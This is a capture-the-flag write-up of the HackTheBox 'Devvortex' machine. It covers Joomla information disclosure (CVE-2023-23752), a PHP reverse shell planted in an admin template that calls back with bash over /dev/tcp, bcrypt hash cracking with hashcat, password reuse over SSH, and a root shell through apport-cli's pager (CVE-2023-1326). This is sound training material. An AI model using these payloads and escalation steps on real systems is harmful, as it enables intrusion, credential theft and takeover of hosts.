---
render_with_liquid: false
title: HackTheBox Writeup  Devvortex
date: 2023-11-26 20:17:55 +1400
tags: [hackthebox, nmap, linux, gobuster, subdomain, feroxbuster, joomla, information-disclosure, cve-2023-23752, joomla2rce, discover-secrets, mysql, hashcat, password-reuse, sudo, apport-cli]
---



Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service&amp;#039;s configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell.


# Recon
---

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Nov 26 20:17:55 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 devvortex.htb
Nmap scan report for devvortex.htb (10.129.37.111)
Host is up, received user-set (0.21s latency).
Scanned at 2023-11-26 20:17:55 CST for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Nov 26 20:18:10 2023 -- 1 IP address (1 host up) scanned in 14.99 seconds
```


## 80 - HTTP : Devvortex Static Site


### Info

![](/assets/obsidian/64a6d88792bedc5add618a37f375061a.png)

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Devvortex]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://devvortex.htb/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]
```

### dev.devvortex.htb - Joomla


#### Info

![](/assets/obsidian/0d314b5dbc4bd0b258902d615dda7456.png)

#### Dir

The site has rate limits

```bash
┌──(bravosec㉿fsociety)-[~/htb/Devvortex]
└─$ feroxbuster -t 150 -o ferox_dev.txt -k -u 'http://dev.devvortex.htb/' -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.devvortex.htb/
 🚀  Threads               │ 150
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_dev.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       69l      208w     3653c http://dev.devvortex.htb/bin
404      GET       69l      208w     3653c http://dev.devvortex.htb/logs
404      GET       69l      208w     3653c http://dev.devvortex.htb/installation
404      GET       69l      208w     3653c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://dev.devvortex.htb/libraries => http://dev.devvortex.htb/libraries/
301      GET        7l       12w      178c http://dev.devvortex.htb/images => http://dev.devvortex.htb/images/
301      GET        7l       12w      178c http://dev.devvortex.htb/includes => http://dev.devvortex.htb/includes/
301      GET        7l       12w      178c http://dev.devvortex.htb/templates => http://dev.devvortex.htb/templates/
301      GET        7l       12w      178c http://dev.devvortex.htb/modules => http://dev.devvortex.htb/modules/
301      GET        7l       12w      178c http://dev.devvortex.htb/media => http://dev.devvortex.htb/media/
301      GET        7l       12w      178c http://dev.devvortex.htb/cache => http://dev.devvortex.htb/cache/
301      GET        7l       12w      178c http://dev.devvortex.htb/plugins => http://dev.devvortex.htb/plugins/
301      GET        7l       12w      178c http://dev.devvortex.htb/tmp => http://dev.devvortex.htb/tmp/
301      GET        7l       12w      178c http://dev.devvortex.htb/language => http://dev.devvortex.htb/language/
301      GET        7l       12w      178c http://dev.devvortex.htb/components => http://dev.devvortex.htb/components/
301      GET        7l       12w      178c http://dev.devvortex.htb/administrator => http://dev.devvortex.htb/administrator/
301      GET        7l       12w      178c http://dev.devvortex.htb/api => http://dev.devvortex.htb/api/
[...]
```

# User Flag
---

## Shell as www-data


### Enum

Joomla was the only dynamic web page, others are just static websites

> http://dev.devvortex.htb/administrator/

![](/assets/obsidian/6baf2f2e3df07647bf6057f9481bab34.png)

### Identify Joomla Version

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version

```bash
curl 'http://dev.devvortex.htb/administrator/manifests/files/joomla.xml'
```

![](/assets/obsidian/66c3feef9b2ba65de3dadc15c82f5d71.png)

### Exploit Joomla 4.2.6 - Unauthenticated information disclosure (CVE-2023-23752)


#### Manually

Google : `Joomla 4.2.6 exploit`

> https://www.exploit-db.com/exploits/51334

We are able to fetch users

![](/assets/obsidian/bbac2b82c46166b87978ea95dbd568c6.png)

There are 2 users, `lewis` and `logan`

> `/api/index.php/v1/users?public=true`

![](/assets/obsidian/75630ea1cc1251cbb9f2f0d37d392619.png)

We are able to get configs

![](/assets/obsidian/99c3cc2cfd27d0226d068ecfb9c6a7d8.png)

> `/api/index.php/v1/config/application?public=true`

Found password : `P4ntherg0t1n5r3c0n##`

![](/assets/obsidian/cf1bdbb358eb9038dbb73a68f327c9a0.png)

#### Exploit script

```bash
searchsploit -m 51334
mv 51334.py 51334.rb
sudo gem install httpx
sudo gem install docopt
sudo gem install paint
```

```bash
ruby 51334.rb http://dev.devvortex.htb
```

![](/assets/obsidian/452c5450e641ac835004d0fd2f9c1664.png)

### Joomla to RCE

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce

Creds : `lewis`:`P4ntherg0t1n5r3c0n##`

![](/assets/obsidian/dd99a39296492ad1a13b1e338c512b02.png)

System -> Site Templates

![](/assets/obsidian/a087cde17267e76c7c6790f0a015f202.png)

Select `Administrator` from dropdown (Since it's the only template we know about the path) then edit the template

![](/assets/obsidian/a30139a286d39947c484a04ef917dff6.png)

Choose **New File** from menu at top left

![](/assets/obsidian/fbf7684face91116669ed4389d69279e.png)

Create a `php` reverse shell

![](/assets/obsidian/0c1adcfba5f8f93de2a6c891699da2ff.png)

```php
<?php system("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.30/1111 0>&1'"); ?>
```

Visit the URL as shown

![](/assets/obsidian/ed16600416e65f8234ae31c39b5dee41.png)

```bash
curl 'http://dev.devvortex.htb/administrator/templates/atum/cache.php'
```

```bash
┌──(bravosec㉿fsociety)-[~/vpn]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.37.111] 54484
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## From www-data to logan


### Enum

Stabilize shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/vpn]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

<vortex.htb/administrator/templates/atum$ export TERM=xterm
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$
```

Get users

```bash
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
logan:x:1000:1000:,,,:/home/logan:/bin/bash
```

### Mysql credential in config file

```bash
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ cd ../../..
www-data@devvortex:~/dev.devvortex.htb$ ls -la
total 120
drwxr-xr-x 17 www-data www-data  4096 Sep 25 16:44 .
drwxr-xr-x  4 root     root      4096 Oct 29 16:07 ..
-rwxr-xr-x  1 www-data www-data 18092 Dec 13  2022 LICENSE.txt
-rwxr-xr-x  1 www-data www-data  4942 Dec 13  2022 README.txt
drwxr-xr-x 11 www-data www-data  4096 Dec 13  2022 administrator
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 api
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cache
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cli
drwxr-xr-x 18 www-data www-data  4096 Dec 13  2022 components
-rw-r--r--  1 www-data www-data  2037 Sep 25 16:44 configuration.php
-rwxr-xr-x  1 www-data www-data  6858 Dec 13  2022 htaccess.txt
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 images
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 includes
-r-xr-x---  1 www-data www-data  1068 Dec 13  2022 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 language
drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 layouts
drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 libraries
drwxr-xr-x 71 www-data www-data  4096 Dec 13  2022 media
drwxr-xr-x 26 www-data www-data  4096 Dec 13  2022 modules
drwxr-xr-x 25 www-data www-data  4096 Dec 13  2022 plugins
-rwxr-xr-x  1 www-data www-data   764 Dec 13  2022 robots.txt
drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 templates
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 tmp
-rwxr-xr-x  1 www-data www-data  2974 Dec 13  2022 web.config.txt
```

```bash
www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php
<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Development';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'lewis@devvortex.htb';
        public $fromname = 'Development';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
        public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;
```

### Dump users table from mysql database

```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##'
```

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```

```bash
mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
[...]
| sd4fg_users 
[...]

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-26 12:41:44 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

### Crack users table from mysql

Save the dump result to `joomla.mysql.users`, then parse it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Devvortex]
└─$ cat joomla.mysql.users | awk -F'|' '{print $4":"$6}' | tr -d " "
:
:
username:password
:
lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
:
:
:
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Devvortex]
└─$ vi joomla.mysql.users.hash
lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

```bash
hashcat joomla.mysql.users.hash /opt/wordlists/rockyou.txt --user -m 3200
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Devvortex]
└─$ hashcat joomla.mysql.users.hash /opt/wordlists/rockyou.txt --user -m 3200 --show
logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

### SSH as logan (Password Reuse)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Devvortex]
└─$ cssh logan@devvortex.htb tequieromucho
[Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 26 Nov 2023 04:26:45 PM UTC

  System load:           0.0
  Usage of /:            67.9% of 4.76GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             177
  Users logged in:       1
  IPv4 address for eth0: 10.129.37.111
  IPv6 address for eth0: dead:beef::250:56ff:feb9:2d34


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

]
Last login: Sun Nov 26 13:09:16 2023 from 10.10.16.30
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:~$ cat user.txt
29fdb76cae87f167da95a1fb24c5498d
```


# Root Flag
---

## From logan to root


### Identify exploit

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

```bash
logan@devvortex:~$ /usr/bin/apport-cli --version
2.20.11
```

Google : `apport-cli 2.20.11 sudo priv exploit`

Found the latest CVE (as of `2023`)

> https://security.snyk.io/vuln/SNYK-UBUNTU2004-APPORT-5422150

`apport-cli` can trigger `less` interface, then attacker can execute arbitrary command

![](/assets/obsidian/82c938de7f8bf0fde6f62cd45403d7cd.png)

![](/assets/obsidian/e3c2609c953f82ad79202720edd30559.png)

Google : `CVE-2023-1326 poc`

> https://attackerkb.com/topics/KU1GvBqpRJ/cve-2023-1326/vuln-details

![](/assets/obsidian/a47907239974f615522d2562fa3b17b9.png)

> https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb

![](/assets/obsidian/5e3e5ca8afaa290984ed4d543decf4e7.png)


### SUDO - apport-cli (CVE-2023-1326)

Check manual for `apport-cli`

```bash
man apport-cli
```

We can specify a program path

![](/assets/obsidian/77cd3c8647e19ebd9e792e79f8c7a4a1.png)

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli bash

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
......................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):V
!sh

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
70207dc9bc1179e4968031af5a7177c8
```

# Additional
---

## apport-cli with crashdump restriction

**If the sudoers rules were like below**

```bash
(ALL : ALL) /usr/bin/apport-cli -c *
```

Start `sleep` then send it **Invalid memory reference** SIGNAL to cause `Segmentation Fault` which generates a kernel crash dump

```bash
logan@devvortex:~$ sleep 20 &
[1] 3285
logan@devvortex:~$ pkill -11 sleep
logan@devvortex:~$
[1]+  Segmentation fault      (core dumped) sleep 20
logan@devvortex:~$ ls -la /var/crash/
total 40
drwxrwxrwt  2 root  root   4096 Nov 26 15:26 .
drwxr-xr-x 13 root  root   4096 Sep 12 17:36 ..
-rw-r-----  1 logan logan 30271 Nov 26 15:26 _usr_bin_sleep.1000.crash
logan@devvortex:~$
```

```bash
logan@devvortex:~$ sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
[...]

What would you like to do? Your options are:
  S: Send report (30.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
[...]
!sh

# id
uid=0(root) gid=0(root) groups=0(root)
```